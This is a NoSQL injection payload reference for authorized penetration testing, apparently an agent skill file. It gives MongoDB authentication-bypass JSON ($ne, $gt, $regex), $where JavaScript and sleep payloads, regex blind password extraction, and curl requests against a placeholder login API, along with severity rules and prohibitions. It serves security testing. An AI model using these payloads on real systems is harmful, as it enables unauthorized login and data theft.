# NoSQL Injection Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

NoSQL injection vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Auth Bypass | ✓ `$ne`, `$gt` injection test | - | Persistent unauthorized access |
| Boolean Blind | ✓ Observe response difference | - | Extract full database |
| Time Blind | ✓ `$where` sleep injection | - | Execute harmful JavaScript |
| Data Extraction | ❌ Not by default | ✓ Extract test data only | Read credentials/sensitive data |

**Safe Validation Method**: Use auth bypass to prove vulnerability; do not harvest data or execute harmful operations.

### JSON Injection
```json
// Bypass authentication (not equal to empty)
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Bypass authentication (greater than empty)
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// Regex bypass
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

### $where Injection
```json
// Inject JavaScript expression
{"$where": "this.username == 'admin' || '1'=='1'"}
{"$where": "this.username === 'admin' && this.password.match(/.*/)"}
```

### $lookup Aggregation Injection
```json
// Inject in aggregation pipeline
[
  {
    "$lookup": {
      "from": "users",
      "localField": "user_id",
      "foreignField": "_id",
      "as": "user_info"
    }
  }
]
```

## Authentication Bypass

### Common Bypass Payloads
```bash
# HTTP POST JSON injection
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# URL parameter injection (common in PHP/Express)
curl -X GET "https://target.com/api/users?username[$ne]=&password[$ne]="
```

## NoSQL Blind Injection

### Regex Blind Injection to Extract Data
```json
// Character-by-character password guessing
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
{"username": "admin", "password": {"$regex": "^c"}}
```

### Time-based Blind Injection
```json
// Use sleep function for time-based blind injection
{"$where": "if(this.username.startsWith('admin')){sleep(5000)}"}
{"username": {"$where": "sleep(5000)"}}
```

## Other NoSQL Databases

### CouchDB, Redis, Elasticsearch
```bash
# CouchDB injection (use built-in views like _all_docs)
curl -X GET "https://target.com/db/_all_docs?startkey=\"\"&endkey=\"￰\""

# Elasticsearch injection (Query String injection)
curl -X GET "https://target.com/_search?q=*:*"

# Redis injection (usually combined with SSRF or CRLF)
# See SSRF Payload for dict:// and gopher:// protocol exploitation
```

*Tools: NoSQLMap, Burp Intruder*

## Analysis Process

1. Identify input points (JSON Body, URL parameters, Headers)
2. Determine if backend uses NoSQL (e.g., MongoDB, CouchDB)
3. Try basic `$ne`, `$gt`, `$regex` logic bypass
4. Test `$where` clause JavaScript injection
5. Try regex blind injection or time-based blind injection to extract data
6. Confirm vulnerability existence

## Output

- Proof payload
- Complete request packet (HTTP format)
- Authentication bypass screenshot or extracted data fragments

## Severity Classification

NoSQL injection severity is based on "whether authentication is actually bypassed or data is actually retrieved". 

| Actual case | Severity | Note |
|---------|------|------|
| `$ne`/`$gt`/`$regex` successfully bypasses authentication and logs in, or blind injection retrieves real data | High | authentication bypass or data disclosure |
| only confirms that operators are parsed (response differs but no login/data retrieval occurs) | Medium | capability confirmed, not closed into impact |
| `$where`/JS injection is disabled or filtered | Low | defense effective |
| Suspected only (abnormal response without stable difference) | Low | Pending confirmation |
| bulk export of the full database or many credentials retrieved | Critical | massive data leak |

**Key judgment**: Reporting High requires confirming authentication was actually bypassed or data was actually retrieved. `{"$ne":""}` returns 200 but did not actually enter another user's session or expose sensitive fields, record as Medium.

---

## Prohibited

- ⚠️ No data deletion or modification operations
- ⚠️ No extracting large amounts of sensitive data (e.g., full table dumping)
- ⚠️ Only prove existence + provide command/PoC